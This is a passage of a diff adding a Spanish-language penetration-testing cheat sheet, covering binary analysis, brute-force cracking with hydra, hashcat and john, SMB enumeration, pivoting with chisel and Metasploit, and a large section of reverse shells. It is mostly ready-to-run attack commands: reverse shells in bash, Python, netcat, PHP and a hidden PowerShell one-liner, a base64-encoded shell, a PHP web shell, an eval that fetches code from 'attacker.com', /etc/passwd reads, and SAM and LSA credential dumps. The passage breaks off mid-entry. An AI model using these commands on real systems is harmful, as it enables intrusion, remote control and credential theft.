+▶ Guardar Cookies (Almacenar cookies de respuesta):
+  curl -c cookies.txt $URL
+
+▶ Usar Cookies Guardadas (Enviar cookies almacenadas):
+  curl -b cookies.txt $URL
+
+▶ Mostrar Cabeceras de Respuesta (Ver headers HTTP):
+  curl -I $URL
+
+[+]------------------------------[ ANÁLISIS DE BINARIOS ]------------------------------[+]
+
+[*] MD5SUM
+▶ Hash MD5 (Verificar integridad):
+  md5sum <binario>
+
+[*] SHA1SUM
+▶ Hash SHA1 (Verificación más robusta): 
+  sha1sum <binario>
+
+[*] SHA256SUM
+▶ Hash SHA256 (Más seguro):
+  sha256sum <binario>
+
+[*] DIFF
+▶ Comparar Archivos (Diferencias textuales):
+  diff archivo1 archivo2
+
+[*] CMP
+▶ Comparar Binarios (Diferencias byte por byte):
+  cmp <binario1> <binario2>
+
+[*] STRINGS
+▶ Buscar Cadenas (Extraer texto legible):
+  strings <binario> | grep "palabra_clave"
+
+▶ Filtro Avanzado (Mínimo 8 caracteres):
+  strings -n 8 <binario> | grep -i "clave"
+
+[*] FILE
+▶ Tipo de Archivo (Identificar formato):
+  file <binario>
+
+[*] LDD
+▶ Verificar Dependencias (Bibliotecas dinámicas):
+  ldd <binario>
+
+[*] READELF
+▶ Leer Cabeceras ELF (Información básica):
+  readelf -h <binario>
+
+▶ Listar Secciones ELF (Estructura interna):
+  readelf -S <binario>
+
+▶ Listar Símbolos ELF (Funciones y variables):
+  readelf -s <binario>
+
+[*] GDB
+▶ Iniciar GDB (Modo silencioso):
+  gdb ./<binario> -q
+
+▶ Generar Patrón (GEF - Para explotación):
+  gef> pattern create 200
+
+▶ Calcular Offset (GEF - Encontrar desplazamiento):
+  gef> pattern offset $eip
+
+▶ Verificar Protecciones (Checksec):
+  gef> checksec
+
+▶ Establecer Breakpoint:
+  break <función>  (Ejemplo: break main)
+
+▶ Ejecutar Programa:
+  run <argumentos>
+
+▶ Ejecutar con Entrada Redirigida:
+  run < input.txt
+
+▶ Examinar Memoria (32 palabras en hexadecimal):
+  x/32x $esp    # También: x/s (strings), x/i (instrucciones)
+
+▶ Desensamblar Función:
+  disassemble <función>  (Ejemplo: disassemble main)
+
+▶ Mostrar Registros:
+  info registers
+
+▶ Continuar Ejecución:
+  continue
+
+▶ Paso a Paso (Instrucción o línea):
+  step    # Entra en funciones
+  next    # No entra en funciones
+
+▶ Mostrar Backtrace (Pila de llamadas):
+  backtrace
+
+▶ Mostrar Variables Locales:
+  info locals
+
+▶ Modificar Registro:
+  set $<registro> = <valor>  (Ejemplo: set $eax = 0x0)
+
+[*] OBJDUMP
+▶ Desensamblar Binario (Sintaxis Intel):
+  objdump -d -M intel <binario>
+
+▶ Mostrar Secciones:
+  objdump -h <binario>
+
+▶ Mostrar Símbolos:
+  objdump -t <binario>
+
+▶ Mostrar Información de Cabecera:
+  objdump -f <binario>
+
+▶ Desensamblar con Código Fuente (Si está disponible):
+  objdump -d -M intel -S <binario>
+
+▶ Extraer Sección Específica:
+  objdump -s --section=.text <binario>
+
+[*] RADARE2
+▶ Abrir Binario:
+  r2 <binario>
+
+▶ Analizar Todo (Automático):
+  [0x00000000]> aaa
+
+▶ Listar Funciones:
+  [0x00000000]> afl
+
+▶ Desensamblar Función:
+  [0x00000000]> pdf @<nombre_funcion>  (Ejemplo: pdf @main)
+
+▶ Buscar Cadenas:
+  [0x00000000]> iz
+
+▶ Buscar Referencias a Función:
+  [0x00000000]> axt <nombre_funcion>
+
+▶ Mostrar Gráfico de Función:
+  [0x00000000]> agf @<nombre_funcion>
+
+▶ Depurar Binario:
+  [0x00000000]> ood    # Abrir en modo depuración
+  [0x00000000]> dc     # Continuar ejecución
+
+▶ Establecer Breakpoint:
+  [0x00000000]> db <dirección>
+
+▶ Paso a Paso:
+  [0x00000000]> ds    # Step
+  [0x00000000]> dn    # Next
+
+▶ Mostrar Registros:
+  [0x00000000]> dr
+
+[*] UPX
+▶ Detectar Empaquetado:
+  upx -t <binario>  # Prueba si está comprimido con UPX
+
+▶ Desempaquetar Binario:
+  upx -d <binario>
+
+[+]------------------------------[ UTILIDADES DIVERSAS ]------------------------------[+]
+
+[*] PHP
+▶ Ver Código en Base64 (Leer archivo codificado):
+  php://filter/convert.base64-encode/resource=contacto.php
+
+▶ Decodificar Base64 (Convertir a texto legible):
+  echo -n '<CÓDIGO_BASE64>' | base64 -d
+
+▶ Reverse Shell en una línea (Conexión remota):
+  php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+▶ Ejecutar Comando (Ejecución vía GET):
+  <?php system($_GET['cmd']); ?>
+
+▶ Leer Archivo (Obtener contenido):
+  <?php echo file_get_contents('/etc/passwd'); ?>
+
+▶ Listar Directorio (Mostrar archivos):
+  <?php print_r(scandir('.')); ?>
+
+▶ Subir Archivo (Carga de ficheros):
+  <?php
+  if (isset($_FILES['file'])) {
+    move_uploaded_file($_FILES['file']['tmp_name'], '/ruta/destino/' . $_FILES['file']['name']);
+    echo "Archivo subido con éxito";
+  }
+  ?>
+
+▶ Ejecutar Código PHP Remoto (Incluir script externo):
+  <?php eval(file_get_contents('http://attacker.com/malicious.txt')); ?>
+
+▶ Generar Shell Interactiva (Terminal persistente):
+  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"); ?>
+
+# Ejemplo de uso:
+# http://vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
+# Este comando intenta leer el contenido del archivo config.php en formato base64.
+# NOTA DE PRECAUCIÓN: Estas técnicas pueden ser peligrosas si se usan en sistemas en producción. Úsalas solo en entornos controlados y con permiso explícito.
+
+[*] PYTHON
+▶ Servidor HTTP Simple (Compartir archivos):
+  python3 -m http.server 8000
+
+▶ Reverse Shell en una línea (Conexión remota):
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+▶ Codificar en Base64 (Texto a Base64):
+  python3 -c "import base64; print(base64.b64encode(b'texto').decode())"
+
+▶ Decodificar Base64 (Base64 a texto):
+  python3 -c "import base64; print(base64.b64decode('dGV4dG8=').decode())"
+
+▶ Ejecutar Comando del Sistema (Ejecutar shell):
+  python3 -c "import os; os.system('ls -la')"
+
+▶ Servidor SMTP para Pruebas (Simular correo):
+  python3 -m smtpd -n -c DebuggingServer localhost:25
+
+▶ Generar Contraseña Hash (Hash SHA512):
+  python3 -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHOD_SHA512)))"
+
+▶ Descargar Archivo (Obtener desde URL):
+  python3 -c "import urllib.request; urllib.request.urlretrieve('http://example.com/file.txt', 'file.txt')"
+
+▶ Escuchar Puerto (Simple socket server):
+  python3 -c "import socket; s=socket.socket(); s.bind(('0.0.0.0',4444)); s.listen(1); c,a=s.accept(); print(f'Conectado: {a}'); c.close()"
+
+# Ejemplo de uso:
+# python3 -m http.server 8000
+# Este comando inicia un servidor HTTP simple en el puerto 8000, útil para transferir archivos rápidamente.
+# NOTA DE PRECAUCIÓN: El servidor HTTP simple no tiene autenticación ni cifrado. Úsalo solo en redes confiables y para transferencias temporales.
+
+[*] BASH
+▶ Reverse Shell (Conexión remota):
+  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+▶ Ejecutar Comando en Segundo Plano (Ejecución desatendida):
+  nohup comando &
+
+▶ Redirigir Salida y Error (Capturar logs):
+  comando > salida.log 2>&1
+
+▶ Bucle For (Iterar rango):
+  for i in {1..10}; do echo $i; done
+
+▶ Comprobar Puerto Abierto (Test de conexión):
+  (echo >/dev/tcp/localhost/80) &>/dev/null && echo "Puerto 80 abierto" || echo "Puerto 80 cerrado"
+
+▶ Generar Contraseña Aleatoria (Crear clave):
+  openssl rand -base64 12
+
+▶ Monitorear Cambios en Directorio (Vigilancia en tiempo real):
+  while true; do clear; ls -lR; sleep 1; done
+
+▶ Descargar Archivo (Usar wget):
+  wget http://example.com/file.txt -O file.txt
+
+▶ Escuchar Puerto con Netcat (Esperar conexión):
+  nc -l 4444
+
+# Ejemplo de uso:
+# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+# Este comando abre una shell inversa conectándose a 10.0.0.1 en el puerto 4444.
+
+[+]------------------------------[ CRACKEO ]------------------------------[+]
+
+[*] CRACKMAPEXEC
+▶ Por SMB (Autenticación SMB):
+  crackmapexec smb <IP> -u <usuario> -p <contraseña>
+
+▶ Por SSH (Autenticación SSH):
+  crackmapexec ssh <IP> -u <usuario/lista_de_usuarios> -p <contraseña/lista_de_contraseñas>
+
+▶ Enumeración de Usuarios (Listar usuarios SMB):
+  crackmapexec smb <IP> -u '' -p '' --users
+
+▶ Dump de Hashes (Extraer SAM):
+  crackmapexec smb <IP> -u <usuario> -p <contraseña> --sam
+
+▶ Ejecución de Comandos (Ejecutar comando remoto):
+  crackmapexec smb <IP> -u <usuario> -p <contraseña> -x "whoami"
+
+▶ Escaneo de Vulnerabilidades (Buscar exploits como Zerologon):
+  crackmapexec smb <IP> -u <usuario> -p <contraseña> -M zerologon
+
+▶ Fuerza Bruta de Dominio (Probar múltiples credenciales):
+  crackmapexec smb <IP> -u users.txt -p passwords.txt --continue-on-success
+
+▶ Enumeración de Shares (Listar recursos compartidos):
+  crackmapexec smb <IP> -u <usuario> -p <contraseña> --shares
+
+[*] NETEXEC
+▶ Por SMB (Autenticación SMB):
+  netexec smb <IP> -u <usuario> -p <contraseña>
+
+▶ Por SSH (Autenticación SSH):
+  netexec ssh <IP> -u <usuario> -p <contraseña>
+
+▶ Enumeración de Shares (Listar recursos compartidos):
+  netexec smb <IP> -u <usuario> -p <contraseña> --shares
+
+▶ Ejecución de Comandos (Ejecutar comando remoto):
+  netexec smb <IP> -u <usuario> -p <contraseña> -x "whoami"
+
+▶ Dump de SAM (Extraer hashes SAM):
+  netexec smb <IP> -u <usuario> -p <contraseña> --sam
+
+▶ Enumeración de Grupos (Listar grupos LDAP):
+  netexec ldap <IP> -u <usuario> -p <contraseña> --groups
+
+▶ Búsqueda de Vulnerabilidades (Detectar Zerologon):
+  netexec smb <IP> -u <usuario> -p <contraseña> -M zerologon
+
+▶ Dump de LSA Secrets (Extraer secretos locales):
+  netexec smb <IP> -u <usuario> -p <contraseña> --lsa
+
+[*] HYDRA
+▶ Escaneo SSH (Fuerza bruta en SSH):
+  hydra -L notas_usuarios.txt -P notas_contraseñas.txt ssh://<IP_o_URL> -t 4
+
+▶ Fuerza Bruta WordPress (Login HTTP POST):
+  hydra -L fsocity-optimize.dic -p test 192.168.1.16 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+
+▶ Ataque FTP (Fuerza bruta en FTP):
+  hydra -l usuario -P /path/to/wordlist.txt ftp://192.168.1.100
+
+▶ Ataque HTTP Basic Auth (Autenticación básica):
+  hydra -L users.txt -P pass.txt <IP> http-get /admin
+
+▶ Ataque RDP (Escritorio remoto):
+  hydra -L users.txt -P pass.txt rdp://<IP>
+
+▶ Ataque SMB (Windows file sharing):
+  hydra -l Administrator -P /path/to/wordlist.txt <IP> smb
+
+▶ Ataque SMTP (Fuerza bruta en correo):
+  hydra -l usuario -P /path/to/wordlist.txt <IP> smtp
+
+▶ Ataque Telnet (Acceso remoto):
+  hydra -L users.txt -P pass.txt telnet://<IP>
+
+▶ Ataque MySQL (Base de datos):
+  hydra -L users.txt -P pass.txt <IP> mysql
+
+▶ Ataque HTTP POST Genérico (Formularios personalizados):
+  hydra -L users.txt -P pass.txt <IP> http-post-form "/login:username=^USER^&password=^PWD^:Login failed"
+
+▶ Ataque SNMP (Protocolo de red):
+  hydra -P /path/to/wordlist.txt <IP> snmp
+
+▶ Ataque POP3 (Correo entrante):
+  hydra -l usuario -P /path/to/wordlist.txt pop3://<IP>
+
+▶ Ataque IMAP (Correo entrante alternativo):
+  hydra -L users.txt -P pass.txt imap://<IP>
+
+# Notas:
+# - Usa "-L" y "-P" (mayúsculas) para cargar listas de usuarios y contraseñas desde un diccionario.
+# - Usa "-l" y "-p" (minúsculas) para especificar un usuario o contraseña ya existente.
+# - Ajusta "-t <número>" para controlar el número de hilos y evitar bloqueos.
+# - Incluye "-v" o "-V" para ver más detalles del proceso.
+
+[*] MEDUSA
+▶ Escaneo SSH (Fuerza bruta en SSH):
+  medusa -h <IP> -u <usuario> -p <contraseña> -M ssh
+
+▶ Ataque HTTP (Autenticación en directorio):
+  medusa -h <IP> -u admin -P /path/to/wordlist.txt -M http -m DIR:/admin
+
+▶ Ataque FTP (Fuerza bruta en FTP):
+  medusa -h <IP> -U users.txt -P passwords.txt -M ftp
+
+▶ Ataque SMB (Windows file sharing):
+  medusa -h <IP> -U users.txt -P passwords.txt -M smbnt
+
+▶ Ataque POP3 (Correo entrante):
+  medusa -h <IP> -U users.txt -P passwords.txt -M pop3
+
+▶ Ataque MySQL (Base de datos):
+  medusa -h <IP> -U users.txt -P passwords.txt -M mysql
+
+▶ Ataque Telnet (Acceso remoto):
+  medusa -h <IP> -U users.txt -P passwords.txt -M telnet
+
+▶ Ataque RDP (Escritorio remoto):
+  medusa -h <IP> -U users.txt -P passwords.txt -M rdp
+
+[*] HASHCAT
+▶ Ataque de Diccionario (Crackeo con wordlist):
+  hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+▶ Ataque de Fuerza Bruta (Probar todas las combinaciones):
+  hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a
+
+▶ Ataque de Máscara (Patrón personalizado):
+  hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?l?l?d?d
+
+▶ Ataque Híbrido (Wordlist + máscara):
+  hashcat -m 1000 -a 6 hash.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d
+
+▶ Ataque de Reglas (Mutaciones de wordlist):
+  hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+▶ Ataque de Combinación (Combinar dos wordlists):
+  hashcat -m 1000 -a 1 hash.txt wordlist1.txt wordlist2.txt
+
+▶ Crackeo de MD5 (Ejemplo básico):
+  hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+▶ Mostrar Resultados (Ver contraseñas crackeadas):
+  hashcat -m 1000 hash.txt --show
+
+[*] JOHN
+▶ Crackeo Básico con Diccionario (Usar wordlist):
+  john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+▶ Mostrar Contraseñas Crackeadas (Ver resultados):
+  john --show unshadowed.txt
+
+▶ Crackear un Hash Específico (Formato definido):
+  john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+▶ Usar Reglas de Mutación (Modificar wordlist):
+  john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+▶ Crackeo en Modo Incremental (Fuerza bruta):
+  john --incremental unshadowed.txt
+
+▶ Crackear Archivo ZIP Protegido (Extraer y crackear hash):
+  zip2john archivo.zip > zip.hash
+  john zip.hash
+
+▶ Crackear Archivo RAR Protegido (Extraer y crackear hash):
+  rar2john archivo.rar > rar.hash
+  john rar.hash
+
+▶ Crackear Archivo PDF Protegido (Extraer y crackear hash):
+  pdf2john archivo.pdf > pdf.hash
+  john pdf.hash
+
+▶ Crackear Hash de SSH (Clave privada):
+  ssh2john id_rsa > ssh.hash
+  john ssh.hash
+
+▶ Crackear Hash NTLM (Windows):
+  john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+[+]------------------------------[ ESTEGANOGRAFIA ]------------------------------[+]
+
+[*] STEGHIDE
+▶ Ocultar Archivo en Imagen (Insertar archivo en imagen):
+  steghide embed -cf imagen.jpg -ef archivo_secreto.txt
+
+▶ Extraer Datos sin Passphrase (Obtener archivo oculto sin contraseña):
+  steghide extract -sf imagen.jpg -xf output.txt -p ""
+
+▶ Ocultar Mensaje en Audio (Insertar texto en archivo WAV):
+  steghide embed -cf audio.wav -ef mensaje.txt
+
+▶ Extraer Mensaje de Audio (Obtener texto oculto en WAV):
+  steghide extract -sf audio.wav
+
+[*] BINWALK
+▶ Analizar con Binwalk (Detectar contenido incrustado):
+  binwalk imagen.jpg
+
+▶ Extraer Archivos con Binwalk (Extraer datos detectados):
+  binwalk -e imagen.jpg
+
+[*] OUTGUESS
+▶ Ocultar en Imagen con Outguess (Insertar datos con clave):
+  outguess -k "clave" -d archivo_secreto.txt imagen.jpg imagen_con_secreto.jpg
+
+▶ Extraer con Outguess (Recuperar datos de imagen):
+  outguess -k "clave" -r imagen_con_secreto.jpg output.txt
+
+[*] EXIFTOOL
+▶ Ver Metadatos Básicos de un Archivo (Inspeccionar metadatos básicos):
+  exiftool archivo.jpg
+
+▶ Ver Metadatos Completos de un Archivo (Mostrar todos los detalles):
+  exiftool -a -u -g archivo.jpg
+
+▶ Eliminar Todos los Metadatos de un Archivo (Borrar información adicional):
+  exiftool -all= archivo.jpg
+
+▶ Extraer Metadatos de Múltiples Archivos (Analizar directorio completo):
+  exiftool -r .
+
+▶ Guardar Metadatos en un Archivo de Texto (Exportar a texto):
+  exiftool archivo.jpg > metadatos.txt
+
+▶ Modificar un Campo Específico (Cambiar autor de metadatos):
+  exiftool -Author="Nuevo Autor" archivo.jpg
+
+▶ Extraer Coordenadas GPS de un Archivo (Obtener ubicación si existe):
+  exiftool -gpslatitude -gpslongitude archivo.jpg
+
+▶ Cambiar Fecha y Hora de Captura (Modificar timestamp):
+  exiftool "-DateTimeOriginal=2025:01:27 10:00:00" archivo.jpg
+
+▶ Copiar Metadatos de un Archivo a Otro (Transferir metadatos):
+  exiftool -tagsfromfile fuente.jpg destino.jpg
+
+▶ Filtrar por Palabra Clave en Metadatos (Buscar texto específico):
+  exiftool archivo.jpg | grep "palabra_clave"
+
+▶ Extraer Miniaturas Incrustadas (Obtener imágenes pequeñas):
+  exiftool -b -ThumbnailImage archivo.jpg > miniatura.jpg
+
+▶ Eliminar Información GPS (Borrar datos de ubicación):
+  exiftool -gps:all= archivo.jpg
+
+▶ Renombrar Archivos por Fecha de Captura (Organizar por timestamp):
+  exiftool '-FileName<DateTimeOriginal' -d %Y%m%d_%H%M%S%%-c.%%e *.jpg
+
+▶ Exportar Metadatos a JSON (Guardar en formato estructurado):
+  exiftool -json archivo.jpg > metadatos.json
+
+[*] STRINGS
+▶ Analizar Imagen con Strings (Buscar texto dentro de imagen):
+  strings imagen.jpg | grep "palabra_clave"
+
+[+]------------------------------[ ENUMERACION SMB ]------------------------------[+]
+
+[*] SMBMAP
+▶ Enumerar Recursos SMB (Listar shares y permisos):
+  smbmap -H $IP -u user -p password
+
+▶ Listar Todos los Shares (Enumerar recursos disponibles):
+  smbmap -H $IP -u anonymous
+
+▶ Descargar Archivo de un Share (Obtener archivo específico):
+  smbmap -H $IP -u user -p password -R share_name --download filename
+
+▶ Descargar Todos los Archivos de un Share (Copiar todo el contenido):
+  smbmap -H $IP -u user -p password -R share_name --download '*'
+
+▶ Ejecutar Comando Remoto (Ejecutar comando en el sistema):
+  smbmap -H $IP -u user -p password -x "ipconfig"
+
+▶ Enumerar con Null Session (Sesión nula sin credenciales):
+  smbmap -H $IP -u "" -p ""
+
+▶ Listar Permisos de Archivos en un Share (Ver accesos detallados):
+  smbmap -H $IP -u user -p password -R share_name -A '*'
+
+▶ Comprobar Acceso de Escritura en un Share (Testear permisos de escritura):
+  smbmap -H $IP -u user -p password -R share_name -W
+
+▶ Explorar Recursos con Puerto Específico (Usar puerto alternativo):
+  smbmap -H $IP -P 445 -u user -p password
+
+▶ Guardar Resultados en un Archivo (Exportar salida):
+  smbmap -H $IP -u user -p password > resultados.txt
+
+▶ Buscar un Archivo Específico en Todos los Shares (Localizar archivo):
+  smbmap -H $IP -u user -p password -F filename
+
+▶ Listar Usuarios y Sesiones Activas (Obtener info de usuarios):
+  smbmap -H $IP -u user -p password -L
+
+[*] SMBCLIENT
+▶ Conectarse a un Recurso SMB (Acceder a un share):
+  smbclient //$IP/RECURSO -U user
+
+▶ Listar Shares Disponibles (Enumerar recursos compartidos):
+  smbclient -L //$IP -U user
+
+▶ Descargar Archivo de un Share (Obtener archivo específico):
+  smbclient //$IP/share -U user -c "get filename"
+
+▶ Subir Archivo a un Share (Enviar archivo al servidor):
+  smbclient //$IP/share -U user -c "put localfile remotefile"
+
+▶ Ejecutar Comandos en Modo Interactivo (Usar shell SMB):
+  smbclient //$IP/share -U user
+  smb: \> ls
+  smb: \> get file
+  smb: \> put file
+
+▶ Montar Share SMB Localmente (Montar en sistema local):
+  mount -t cifs //$IP/share /mnt/share -o username=user,password=pass
+
+▶ Conexión Anónima (Acceder sin credenciales):
+  smbclient -L //$IP -N
+
+[*] ENUM4LINUX
+▶ Enumeración Completa (Obtener toda la información disponible):
+  enum4linux -a $IP
+
+▶ Enumeración de Usuarios (Listar usuarios del sistema):
+  enum4linux -U $IP
+
+▶ Enumeración de Shares (Listar recursos compartidos):
+  enum4linux -S $IP
+
+▶ Enumeración de Información del Sistema Operativo (Detectar OS):
+  enum4linux -o $IP
+
+▶ Enumeración de Grupos (Listar grupos del dominio):
+  enum4linux -G $IP
+
+▶ Enumeración de Políticas de Contraseña (Ver políticas de seguridad):
+  enum4linux -P $IP
+
+▶ Enumeración con Credenciales (Usar autenticación):
+  enum4linux -u user -p password -a $IP
+
+[+]------------------------------[ PIVOTING ]------------------------------[+]
+
+[*] SSH
+▶ Conexión por SSH (Acceder a máquina remota):
+  ssh usuario@$IP
+
+▶ Local Port Forwarding (Redirigir puerto local a remoto):
+  ssh -L 8080:localhost:80 usuario@$IP
+
+▶ Dynamic Port Forwarding (Crear proxy SOCKS):
+  ssh -D 9050 usuario@$IP
+
+▶ Remote Port Forwarding (Redirigir puerto remoto a local):
+  ssh -R 8080:localhost:80 usuario@$IP
+
+▶ Jump Host (Usar máquina intermedia):
+  ssh -J usuario@jump_host usuario@$IP
+
+▶ Túnel SSH con Autenticación de Clave (Usar clave privada):
+  ssh -i /path/to/private_key -L 8080:localhost:80 usuario@$IP
+
+▶ Túnel SSH Persistente (Mantener túnel activo):
+  autossh -M 0 -f -N -L 8080:localhost:80 usuario@$IP
+
+▶ SSH con Puerto Específico (Conectar a puerto no estándar):
+  ssh -p 2222 usuario@$IP
+
+[*] CHISEL
+▶ Servidor (Ejecutar en máquina comprometida):
+  ./chisel server -p 8000 --reverse
+
+▶ Cliente (Conectar desde máquina atacante):
+  ./chisel client $IP:8000 R:socks
+
+▶ Port Forwarding (Redirigir puerto específico):
+  ./chisel client $IP:8000 R:3306:localhost:3306
+
+▶ Reverse Port Forwarding (Redirigir puerto remoto a local):
+  ./chisel client $IP:8000 R:8001:127.0.0.1:8001
+
+▶ Túnel SOCKS5 (Crear proxy SOCKS5):
+  ./chisel client $IP:8000 R:socks
+
+▶ Múltiples Túneles (Redirigir varios puertos):
+  ./chisel client $IP:8000 R:80:localhost:80 R:443:localhost:443
+
+▶ Túnel con Autenticación (Usar clave):
+  ./chisel client --auth user:pass $IP:8000 R:socks
+
+[*] PROXYCHAINS
+▶ Configurar /etc/proxychains.conf (Definir proxy SOCKS):
+  socks5 127.0.0.1 9050
+
+▶ Usar con Cualquier Comando (Ejecutar a través de proxy):
+  proxychains nmap -sT -p80,443 $IP
+
+▶ Usar con Herramientas Específicas (Ejemplo con navegador):
+  proxychains firefox
+
+▶ Encadenar Múltiples Proxies (Usar archivo de configuración personalizado):
+  proxychains4 -f /ruta/a/config curl $URL
+
+▶ Verificar Conexión (Probar proxy con curl):
+  proxychains curl ifconfig.me
+
+[*] METASPLOIT
+▶ Configurar SOCKS Proxy (Crear proxy SOCKS5):
+  use auxiliary/server/socks_proxy
+  set VERSION 5
+  set SRVPORT 9050
+  run
+
+▶ Usar Route para Pivoting (Añadir ruta a red interna):
+  route add 192.168.1.0 255.255.255.0 1
+
+▶ Crear Túnel Reverso (Configurar Meterpreter reverso):
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set LHOST 0.0.0.0
+  set LPORT 4444
+  exploit -j
+
+▶ Pivoting con Meterpreter (Enrutar tráfico por sesión):
+  meterpreter > run autoroute -s 192.168.1.0/24
+
+▶ Escanear Red Interna (Usar módulo de escaneo):
+  use auxiliary/scanner/portscan/tcp
+  set RHOSTS 192.168.1.0/24
+  set THREADS 10
+  run
+
+[+]------------------------------[ REVERSE SHELLS ]------------------------------[+]
+
+[*] BASH
+▶ Reverse Shell Básica (Conectar con /dev/tcp):
+  bash -i >& /dev/tcp/$IP/4444 0>&1
+
+▶ Reverse Shell Codificada en Base64 (Ejecutar codificada):
+  echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8kSVAvNDQ0NCAwPiYx" | base64 -d | bash
+
+▶ Reverse Shell con /dev/tcp (Usar descriptor de archivo):
+  0<&196;exec 196<>/dev/tcp/$IP/4444; sh <&196 >&196 2>&196
+
+▶ Reverse Shell con Netcat (Usar FIFO y nc):
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4444 >/tmp/f
+
+▶ Reverse Shell con Telnet (Usar pipe y telnet):
+  rm -f /tmp/p; mknod /tmp/p p && telnet $IP 4444 0/tmp/p
+
+[*] PYTHON
+▶ Reverse Shell en una Línea (Shell básica):
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+▶ Reverse Shell con PTY (Shell interactiva mejorada):
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+▶ Reverse Shell con Subprocess (Usar subprocess para stdin/stdout):
+  python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+
+[*] NETCAT
+▶ Reverse Shell Básica (Conectar con -e):
+  nc -e /bin/sh $IP 4444
+
+▶ Reverse Shell Alternativa (Sin -e, usando FIFO):
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4444 >/tmp/f
+
+▶ Bind Shell (Escuchar en máquina víctima):
+  nc -lvp 4444 -e /bin/sh
+
+▶ Reverse Shell con /dev/tcp (Enviar shell por nc):
+  /bin/sh | nc $IP 4444
+
+▶ Reverse Shell UDP (Usar protocolo UDP):
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u $IP 4444 >/tmp/f
+
+[*] PHP
+▶ Reverse Shell en una Línea (Usar fsockopen):
+  php -r '$sock=fsockopen("$IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+▶ Reverse Shell con system() (Ejecutar con system):
+  php -r '$sock=fsockopen("$IP",4444);system("/bin/sh -i <&3 >&3 2>&3");'
+
+▶ Reverse Shell con passthru() (Ejecutar con passthru):
+  php -r '$sock=fsockopen("$IP",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
+
+▶ Reverse Shell con popen() (Usar popen para shell):
+  php -r '$p=popen("sh -i <&3 >&3 2>&3", "r"); pclose($p);'
+
+[*] POWERSHELL
+▶ Reverse Shell en una Línea (Shell interactiva completa):
+  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+▶ Reverse Shell con Codificación Base64 (Ejecutar codificada):
